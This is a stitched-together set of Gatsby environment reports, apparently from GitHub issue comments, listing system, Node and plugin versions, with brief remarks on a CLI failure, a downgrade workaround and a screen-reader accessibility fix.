system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 3.7.3 - /users/andrewaylett/.pyenv/shims/python browsers: chrome: 83.0.4103.61 firefox: 77.0 safari: 12.1.2 npmpackages: gatsby: ^2.22.13 => 2.22.13
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v14.3.0/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm languages: python: 3.8.0 - /users/leo/.pyenv/shims/python browsers: chrome: 83.0.4103.61 firefox: 76.0 safari: 13.1 npmpackages: gatsby: 2.22.13 => 2.22.13 gatsby-plugin-layout: 1.3.2 => 1.3.2 gatsby-plugin-lodash: 3.3.2 => 3.3.2 gatsby-plugin-material-ui: 2.1.9 => 2.1.9 gatsby-plugin-nprogress: 2.3.2 => 2.3.2 gatsby-plugin-postcss: 2.3.2 => 2.3.2 gatsby-plugin-react-redux: 1.1.0-0 => 1.1.0-0 gatsby-plugin-robots-txt: 1.5.1 => 1.5.1 gatsby-plugin-typescript: 2.4.3 => 2.4.3 gatsby-plugin-typography: 2.5.2 => 2.5.2 gatsby-source-filesystem: 2.3.8 => 2.3.8 gatsby-transformer-json: 2.4.3 => 2.4.3 ``` tsconfig.json
{ "compileroptions": { "baseurl": ".", "lib": ["esnext", "dom"], "target": "esnext", "module": "esnext", "moduleresolution": "node", "noemit": true, "strict": true, "allowsyntheticdefaultimports": true, "isolatedmodules": true, "allowjs": true, "esmoduleinterop": true, "disablesizelimit": true, "jsx": "preserve" }, "include": ["."], "exclude": ["node_modules", "public", ".cache", "data", "static"]
system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-9700k cpu @ 3.60ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 13.14.0 - ~/.nvm/versions/node/v13.14.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v13.14.0/bin/npm languages: python: 3.6.9 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: ^2.13.31 => 2.22.12 gatsby-image: ^2.0.23 => 2.4.5 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-netlify: ^2.0.6 => 2.3.3 gatsby-plugin-netlify-cms: ^4.1.6 => 4.3.3 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.0.4 => 3.3.2 gatsby-plugin-sass: ^2.0.7 => 2.3.2 gatsby-plugin-sharp: ^2.2.9 => 2.6.9 gatsby-remark-copy-linked-files: ^2.0.7 => 2.3.3 gatsby-remark-images: ^3.1.6 => 3.3.8 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.0.26 => 2.3.8 gatsby-source-wordpress: ^3.3.8 => 3.3.8 gatsby-transformer-remark: ^2.6.9 => 2.8.13 gatsby-transformer-sharp: ^2.1.9 => 2.5.3
ios using voiceover ### possible fix this could be because the menu isn't hidden by display:none; visibility:hidden; or such, but only somehow moved to the background or off the view port
that, however, doesn't make it invisible to screen readers
if solving this via css isn\'t possible, aria-hidden="true" should be applied to the container of that menu when it is hidden, and the attribute should be removed once it is made visible.
system: os: macos 10.15.4 cpu: (16) x64 intel(r) xeon(r) w-2140b cpu @ 3.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 83.0.4103.61 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.22.3 => 2.22.3 gatsby-cli: ^2.12.29 => 2.12.29 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-env-variables: ^1.0.1 => 1.0.2 gatsby-plugin-flow: ^1.1.21 => 1.3.2 gatsby-plugin-google-analytics: ^2.1.35 => 2.3.1 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-netlify: ^2.1.32 => 2.3.2 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-preconnect: ^1.1.23 => 1.1.30 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-remove-console: ^0.0.2 => 0.0.2 gatsby-plugin-remove-generator: ^1.0.4 => 1.0.4 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.2 gatsby-plugin-sitemap: ^2.3.0 => 2.4.2 gatsby-plugin-styled-components: ^3.3.2 => 3.3.2 gatsby-plugin-svg-sprite-loader: ^0.1.4 => 0.1.4 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.9 => 1.1.9 gatsby-source-filesystem: ^2.1.48 => 2.3.1 gatsby-source-google-spreadsheet: ^2.0.0 => 2.0.0 gatsby-source-prismic: breakingweb/gatsby-source-prismic#download-raw-dist => 3.0.2 gatsby-transformer-json: ^2.2.28 => 2.4.1 gatsby-transformer-sharp: ^2.5.0 => 2.5.2
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 safari: 13.1 npmpackages: gatsby: ^2.11.7 => 2.20.13 gatsby-image: ^2.2.3 => 2.3.1 gatsby-link: ^2.2.0 => 2.3.2 gatsby-plugin-catch-links: ^2.2.1 => 2.2.1 gatsby-plugin-eslint: ^2.0.5 => 2.0.8 gatsby-plugin-feed: ^2.5.0 => 2.5.0 gatsby-plugin-lunr: ^1.5.2 => 1.5.2 gatsby-plugin-manifest: ^2.2.0 => 2.3.3 gatsby-plugin-offline: ^2.2.0 => 2.2.10 gatsby-plugin-playground: ^1.0.6 => 1.0.6 gatsby-plugin-react-helmet: ^3.1.0 => 3.2.1 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.0 => 2.2.1 gatsby-plugin-schema-snapshot: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.2.1 => 2.5.4 gatsby-plugin-sitemap: ^2.4.1 => 2.4.1 gatsby-source-contentful: ^2.1.4 => 2.2.7 gatsby-source-filesystem: ^2.1.1 => 2.2.2 gatsby-transformer-sharp: ^2.2.0 => 2.4.4 gatsby-transformer-sqip: ^2.1.3 => 2.2.4
```sh system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-source-prismic-graphql: ^3.6.2 => 3.6.2 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 ```
`gatsby info --clipboard` does not run.
``` system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-3630qm cpu @ 2.40ghz shell: 4.4.20 - /bin/bash languages: python: 2.7.17 - /home/alexandre/.pyenv/shims/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 npmpackages: gatsby: ^2.21.17 => 2.22.12 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-material-ui: ^2.1.9 => 2.1.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-source-graphql: ^2.5.2 => 2.5.2 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 ```
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: node: 10.20.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.2 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.22.5 => 2.22.5 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-create-client-paths: ^2.3.2 => 2.3.2 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-manifest: ^2.4.8 => 2.4.8 gatsby-plugin-material-ui: ^2.1.8 => 2.1.8 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sass: ^2.3.2 => 2.3.2 gatsby-plugin-sharp: ^2.6.8 => 2.6.8 gatsby-source-filesystem: ^2.3.7 => 2.3.7 gatsby-transformer-sharp: ^2.5.3 => 2.5.3
``` system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 13.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 74.0 safari: 13.1 npmpackages: gatsby: ^2.22.11 => 2.22.11 gatsby-image: ^2.4.5 => 2.4.5 gatsby-link: ^2.4.3 => 2.4.3 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-feed: ^2.5.3 => 2.5.3 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-mdx: ^1.2.12 => 1.2.12 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-plugin-styled-components: ^3.3.2 => 3.3.2 gatsby-plugin-twitter: ^2.3.2 => 2.3.2 gatsby-plugin-typescript: ^2.4.3 => 2.4.3 gatsby-remark-copy-linked-files: ^2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.8 => 3.3.8 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-remark-smartypants: ^2.3.2 => 2.3.2 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-json: ^2.4.3 => 2.4.3 gatsby-transformer-remark: ^2.8.13 => 2.8.13 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.11.18
``` system: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.22.10 => 2.22.10 gatsby-cli: ^2.12.35 => 2.12.35 gatsby-image: ^2.4.5 => 2.4.5 gatsby-link: ^2.4.3 => 2.4.3 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-canonical-urls: ^2.3.2 => 2.3.2 gatsby-plugin-emotion: ^4.3.2 => 4.3.2 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.2 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-mdx: ^1.2.12 => 1.2.12 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-page-creator: ^2.3.7 => 2.3.7 gatsby-plugin-react-helmet-async: ^1.0.16 => 1.0.16 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-sitemap: ^2.4.3 => 2.4.3 gatsby-remark-autolink-headers: ^2.3.3 => 2.3.3 gatsby-remark-prismjs: ^3.5.2 => 3.5.2 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.35
gatsby-cli@2.12.35
npm: 6.14.5
``` system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 12.14.0 - ~/.nvm/versions/node/v12.14.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/benbria/loop-dashboard/node_modules/.bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: firefox: 76.0.1 npmpackages: gatsby: ^2.22.9 => 2.22.9 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-create-client-paths: ^2.2.4 => 2.2.4 gatsby-plugin-less: ^3.1.1 => 3.1.1 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-transformer-sharp: ^2.4.6 => 2.4.6 npmglobalpackages: gatsby-cli: 2.11.2
``` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 safari: 13.1 npmpackages: gatsby: ^2.21.9 => 2.21.9 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-canonical-urls: ^2.3.0 => 2.3.0 gatsby-plugin-portal: ^1.0.7 => 1.0.7 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sass: ^2.3.0 => 2.3.0 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-source-apiserver: ^2.1.4 => 2.1.4 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-source-graphql: ^2.5.0 => 2.5.0 gatsby-source-greenhouse-job-board: ^1.0.3 => 1.0.3 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 gatsby-transformer-yaml: ^2.4.0 => 2.4.0 npmglobalpackages: gatsby-cli: 2.12.5
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 3.2.57 - /bin/bash binaries: node: 13.9.0 - ~/.nvm/versions/node/v13.9.0/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v13.9.0/bin/npm languages: python: 3.7.4 - /users/riley/.pyenv/shims/python browsers: chrome: 81.0.4044.138 safari: 13.1 npmpackages: gatsby: ^2.21.36 => 2.21.36 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-feed: ^2.5.1 => 2.5.1 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-remark-autolink-headers: ^2.3.2 => 2.3.2 gatsby-remark-copy-linked-files: ^2.3.2 => 2.3.2 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.3.4 => 3.3.4 gatsby-remark-prismjs: ^3.5.1 => 3.5.1 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-transformer-json: ^2.4.2 => 2.4.2 gatsby-transformer-remark: ^2.8.9 => 2.8.9 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 npmglobalpackages: gatsby-cli: 2.12.8
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-8700 cpu @ 3.20ghz binaries: node: 12.16.2 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - ~\\.yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.18 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.37 => 2.21.37 npmglobalpackages: gatsby-cli: 2.12.34
$ gatsby info --clipboard system: os: linux 5.3 pop!_os 18.04 lts cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 4.4.20 - /bin/bash languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 npmpackages: gatsby: 2.22.0 => 2.22.0
``` ### temporary fix
for me, it works to downgrade to gatsby `2.21.40`.
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 13.8.0 - ~/.nvm/versions/node/v13.8.0/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v13.8.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 safari: 13.1 npmpackages: gatsby: ^2.20.35 => 2.22.0 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-manifest: ^2.3.7 => 2.4.6 gatsby-plugin-offline: ^3.1.5 => 3.2.4 gatsby-plugin-react-helmet: ^3.2.5 => 3.3.1 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-styled-components: ^3.3.2 => 3.3.2 gatsby-source-filesystem: ^2.2.5 => 2.3.5 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.11.11
``` system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-3770k cpu @ 3.50ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.11 browsers: edge: 44.18362.449.0 npmpackages: gatsby: 2.22.9 => 2.22.9 gatsby-cli: 2.12.16 => 2.12.16 gatsby-link: 2.4.2 => 2.4.2 gatsby-plugin-catch-links: 2.3.1 => 2.3.1 gatsby-plugin-mdx: 1.2.12 => 1.2.12 gatsby-plugin-react-helmet: 3.3.1 => 3.3.1 gatsby-plugin-sharp: 2.6.2 => 2.6.2 gatsby-remark-autolink-headers: 2.3.1 => 2.3.1 gatsby-remark-copy-linked-files: 2.3.2 => 2.3.2 gatsby-remark-images: 3.3.2 => 3.3.2 gatsby-remark-prismjs: 3.5.1 => 3.5.1 gatsby-source-filesystem: 2.3.1 => 2.3.1 gatsby-source-github: 0.0.2 => 0.0.2 gatsby-source-typedoc: 1.0.6 => 1.0.6 gatsby-transformer-remark: 2.8.7 => 2.8.7 gatsby-transformer-sharp: 2.5.2 => 2.5.2 npmglobalpackages: gatsby-source-typedoc: 1.0.6
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.37 => 2.22.9 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.9 gatsby-plugin-offline: ^3.2.3 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.9 gatsby-source-contentful: ^2.3.12 => 2.3.12 gatsby-source-filesystem: ^2.3.4 => 2.3.8 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 ```
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-4460 cpu @ 3.20ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.3 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-source-graphql: ^2.5.2 => 2.5.2 npmglobalpackages: gatsby-cli: 2.12.34
[2020-05-23t09_02_07_530z-debug.log](
``` system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (8) x64 intel(r) core(tm) i5-8265u cpu @ 1.60ghz shell: 5.0.3 - /bin/bash binaries: node: 12.16.1 - /tmp/yarn--1590166014711-0.6080215808640919/node yarn: 1.21.1 - /tmp/yarn--1590166014711-0.6080215808640919/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 npmpackages: gatsby: ^2.21.37 => 2.21.37
system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (2) x64 intel(r) xeon(r) cpu e5-2686 v4 @ 2.30ghz shell: 4.4.20 - /bin/bash binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm npmglobalpackages: gatsby-cli: 2.12.34
system: os: windows 10 10.0.18363 cpu: (16) x64 amd ryzen 7 2700x eight-core processor binaries: node: 13.14.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.6.8 - c:\\users\\jacobo\\appdata\\local\\programs\\python\\python36\\python.exe browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.2 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.61 firefox: 68.0.2 safari: 13.1 npmpackages: gatsby: ^2.19.7 => 2.22.9 gatsby-cli: ^2.12.29 => 2.12.34 gatsby-image: ^2.2.39 => 2.4.5 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-google-tagmanager: ^2.3.1 => 2.3.3 gatsby-plugin-mailchimp: ^5.1.2 => 5.1.2 gatsby-plugin-manifest: ^2.2.39 => 2.4.9 gatsby-plugin-offline: ^3.0.32 => 3.2.7 gatsby-plugin-react-helmet: ^3.1.21 => 3.3.2 gatsby-plugin-sass: ^2.1.29 => 2.3.2 gatsby-plugin-sharp: ^2.4.3 => 2.6.9 gatsby-source-filesystem: ^2.1.46 => 2.3.8 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-transformer-sharp: ^2.3.13 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.34
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 11.12.0 - ~/.nvm/versions/node/v11.12.0/bin/node yarn: 1.19.0 - ~/.yarn/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v11.12.0/bin/npm languages: python: 3.6.1 - /users/stefan.imhoff/.pyenv/shims/python browsers: chrome: 83.0.4103.61 firefox: 72.0.2 safari: 13.1 npmpackages: gatsby: ^2.20.29 => 2.20.29 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-manifest: ^2.3.6 => 2.3.6 gatsby-plugin-mdx: ^1.1.10 => 1.1.10 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-plugin-styled-components: ^3.3.2 => 3.3.2 gatsby-plugin-typescript: ^2.3.3 => 2.3.3 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-acronyms: ^1.1.0 => 1.1.0 gatsby-remark-autolink-headers: ^2.2.3 => 2.2.3 gatsby-remark-copy-linked-files: ^2.2.3 => 2.2.3 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.2.5 => 3.2.5 gatsby-remark-numbered-footnotes: ^1.0.1 => 1.0.1 gatsby-remark-reading-time: ^1.1.0 => 1.1.0 gatsby-remark-responsive-iframe: ^2.3.3 => 2.3.3 gatsby-remark-smartypants: ^2.2.3 => 2.2.3 gatsby-remark-unwrap-images: ^1.0.2 => 1.0.2 gatsby-remark-vscode: ^2.0.3 => 2.0.3 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-transformer-json: ^2.3.3 => 2.3.3 gatsby-transformer-sharp: ^2.4.6 => 2.4.6 gatsby-transformer-yaml: ^2.3.3 => 2.3.3 npmglobalpackages: gatsby-cli: 2.8.29
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 firefox: 74.0 safari: 13.1 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-mdx: ^1.2.11 => 1.2.11 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-vscode: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.2.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.138 firefox: 76.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-image: ^2.4.4 => 2.4.4 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.4 => 2.6.4 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-transformer-sharp: ^2.5.2 => 2.5.2
even if i run gatsby info --clipboard command, the same error pops up
node version = 13.8.0
npm version = 6.13.6 sorry for limited info
i'm trying everything to bring back cli
system: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 edge: 81.0.416.72 firefox: 74.0.1 safari: 13.1 npmglobalpackages: gatsby-cli: 2.12.31 _nb i had to do the above manual install of `detect-port` to get this to work_
